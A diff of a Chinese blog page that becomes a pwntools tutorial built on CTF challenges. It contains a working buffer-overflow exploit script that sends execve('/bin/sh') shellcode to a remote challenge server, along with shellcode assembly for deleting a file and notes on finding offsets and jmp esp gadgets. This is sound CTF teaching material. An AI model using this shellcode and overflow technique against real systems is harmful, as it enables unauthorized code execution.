@@ -6,15 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2019 | 怪咖的小屋</title>
+  <title>怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="Pythonpwn使用方法基础用法：以实验吧 pilot为例： 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-from  pwn  import  *  #导入pwn#remote建立远程连接，需要参数(ip,port)#如果本地执行的话:#p = process(&apos;./pilot&apos;)p  =  r">
+<meta property="og:type" content="article">
 <meta property="og:title" content="怪咖的小屋">
-<meta property="og:url" content="http://yoursite.com/archives/2019/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
+<meta property="og:description" content="Pythonpwn使用方法基础用法：以实验吧 pilot为例： 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-from  pwn  import  *  #导入pwn#remote建立远程连接，需要参数(ip,port)#如果本地执行的话:#p = process(&apos;./pilot&apos;)p  =  r">
 <meta property="og:locale" content="zh">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/9075b03109db06effc5021ad08269d07.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/1838d70fb3f9614721dd4efe9551c916.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/1368de3c660aae209011eb00e1f46bb2.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/09c4c9f5be43b6c0fefa5ce448f06a4d.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/1c01dec99118cee6ee97d2eba68d2546.png">
+<meta property="og:updated_time" content="2019-09-10T09:44:45.330Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="怪咖的小屋">
+<meta name="twitter:description" content="Pythonpwn使用方法基础用法：以实验吧 pilot为例： 123456789101112131415161718192021222324252627282930# -*- coding:utf-8 -*-from  pwn  import  *  #导入pwn#remote建立远程连接，需要参数(ip,port)#如果本地执行的话:#p = process(&apos;./pilot&apos;)p  =  r">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/10/Pythonpwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -146,235 +157,173 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Pythonpwn使用方法" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Pythonpwn使用方法"><a href="#Pythonpwn使用方法" class="headerlink" title="Pythonpwn使用方法"></a><strong>Pythonpwn使用方法</strong></h3><h4 id="基础用法："><a href="#基础用法：" class="headerlink" title="基础用法："></a><strong>基础用法：</strong></h4><p>以<strong>实验吧 pilot</strong>为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *  <span class="comment">#导入pwn</span></span><br><span class="line"><span class="comment">#remote建立远程连接，需要参数(ip,port)</span></span><br><span class="line"><span class="comment">#如果本地执行的话:</span></span><br><span class="line"><span class="comment">#p = process('./pilot')</span></span><br><span class="line">p  =  remote(<span class="string">"106.2.25.7"</span>,<span class="number">8003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Location:'</span>)  <span class="comment">#接收信息直到出现关键字'Location'</span></span><br><span class="line">addr  =  int  (p.recvuntil(<span class="string">'\n'</span>)[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)  <span class="comment">#将之后接收到的信息的14位16进制数转成int存储起来</span></span><br><span class="line"><span class="keyword">print</span>  addr</span><br><span class="line"></span><br><span class="line">shellcode  =  <span class="string">'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#布局</span></span><br><span class="line">payload  =  shellcode  +  ((<span class="number">40</span>  -  len(shellcode))*<span class="string">'A'</span>)  +  p64(addr)</span><br><span class="line"><span class="comment">#接收信息直到出现关键字'Command:'</span></span><br><span class="line">p.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line"><span class="comment">#将payload发送出去</span></span><br><span class="line"><span class="comment">#p.sendline()发送之后默认在后面加换行</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line">p.send(payload+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#与其进行交互</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">利用思路：cyclic 100计算溢出偏移长度,Location定位字符串开始的位置,布局为 shellcode+padding+addr</span></span><br><span class="line"><span class="string">执行到返回,劫持返回地址到addr,addr指向Location,即字符串开始的位置,之后执行shellcode,拿到shell</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cat home/flag</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="shellcode生成操作-汇编转操作码-："><a href="#shellcode生成操作-汇编转操作码-：" class="headerlink" title="shellcode生成操作(汇编转操作码)："></a><strong>shellcode生成操作(汇编转操作码)：</strong></h4><p>以<strong>实验吧</strong>  <strong>加减乘除</strong>为例：<br><img src="/2019/09/10/Pythonpwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png" alt><br>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">code  =  <span class="string">'''.global _start</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">jmp test1</span></span><br><span class="line"><span class="string">test2:</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">mov al, 0xa</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov al, 0x1</span></span><br><span class="line"><span class="string">xor ebx, ebx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">test1:</span></span><br><span class="line"><span class="string">call test2</span></span><br><span class="line"><span class="string">.string "delfile" '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置环境</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">arch设置架构为x86</span></span><br><span class="line"><span class="string">os设置系统为linux</span></span><br><span class="line"><span class="string">endian设置大小端模式为小端</span></span><br><span class="line"><span class="string">word_size设置字长为32</span></span><br><span class="line"><span class="string">log_level设置日志输出等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">context(arch  =  <span class="string">'x86'</span>,  os  =  <span class="string">'linux'</span>,  endian  =  <span class="string">'little'</span>,  word_size  =  <span class="number">32</span>,  log_level  =  <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将code编码输出</span></span><br><span class="line">shellcode  =  asm(code).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span>  shellcode</span><br><span class="line"><span class="keyword">print</span>  type(shellcode)</span><br><span class="line"><span class="comment">#格式化，加上'\x'</span></span><br><span class="line">r  =  <span class="string">''</span></span><br><span class="line">count  =  <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span>  shellcode:</span><br><span class="line">    <span class="keyword">if</span>  count  %  <span class="number">2</span>  ==  <span class="number">0</span>:</span><br><span class="line">        r  +=  <span class="string">r'\x'</span></span><br><span class="line">    r  +=  i</span><br><span class="line">    count  +=  <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span>  r</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：<br><img src="/2019/09/10/Pythonpwn使用方法/9075b03109db06effc5021ad08269d07.png" alt><br>注意删掉<strong>\x00坏字符</strong>，提交拿到key值：<br><img src="/2019/09/10/Pythonpwn使用方法/1838d70fb3f9614721dd4efe9551c916.png" alt></p>
+<h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a><strong>其他：</strong></h4><h5 id="在寻找溢出长度时："><a href="#在寻找溢出长度时：" class="headerlink" title="在寻找溢出长度时："></a><strong>在寻找溢出长度时：</strong></h5><p>#生成指定长度的不重复序列</p>
+<p>#cyclic 100</p>
+<p>#用于查找指定序列的偏移量</p>
+<p>#cyclic -l gaaa<br>使用截图如下：<br><img src="/2019/09/10/Pythonpwn使用方法/1368de3c660aae209011eb00e1f46bb2.png" alt></p>
+<h5 id="ELF文件操作："><a href="#ELF文件操作：" class="headerlink" title="ELF文件操作："></a><strong>ELF文件操作：</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获得该ELF的句柄</span></span><br><span class="line"><span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libgcc_s.so.1");</span></span><br><span class="line"><span class="comment">#将jmp esp对应的汇编代码送给jmp_esp</span></span><br><span class="line"><span class="comment">#jmp_esp = asm("jmp esp")</span></span><br><span class="line"><span class="comment">#在libc中搜索对应的汇编代码，并将为该汇编代码的地址返回给jmp_eso_addr_offset</span></span><br><span class="line"><span class="comment">#jmp_esp_addr_offset=libc.search(jmp_esp).next()</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="自动生成shellcode"><a href="#自动生成shellcode" class="headerlink" title="自动生成shellcode"></a><strong>自动生成shellcode</strong></h5><p><img src="/2019/09/10/Pythonpwn使用方法/09c4c9f5be43b6c0fefa5ce448f06a4d.png" alt></p>
+<h5 id="数据打包："><a href="#数据打包：" class="headerlink" title="数据打包："></a><strong>数据打包：</strong></h5><p>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便<br>用法：</p>
+<ul>
+<li>p32/p64: 打包一个整数,分别打包为32或64位</li>
+<li>u32/u64: 解包一个字符串,得到整数</li>
+</ul>
+<p>使用截图如下：<br><img src="/2019/09/10/Pythonpwn使用方法/1c01dec99118cee6ee97d2eba68d2546.png" alt></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感觉还不错的话就嘿嘿嘿吧<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/输入表重建工具ImportREC/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:22:16.817Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/10/Pythonpwn使用方法/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python字符串开头b r u含义/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:21:57.846Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python网络编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:21:57.835Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+<nav id="article-nav">
+  
+    <a href="/2019/09/10/格式化字符串漏洞利用/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/PythonPIL简单编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:21:57.823Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Pythonpexpect/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:21:57.811Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python z3-solver/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:21:57.799Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python binascii模块/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:21:57.764Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/PythonHash/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:17:48.582Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python 邮件编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:16:43.709Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/格式化字符串漏洞利用/" class="archive-article-date">
-  	<time datetime="2019-09-10T09:12:48.107Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2019/page/2/">2</a><a class="extend next" rel="next" href="/archives/2019/page/2/">Next &raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -398,8 +347,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
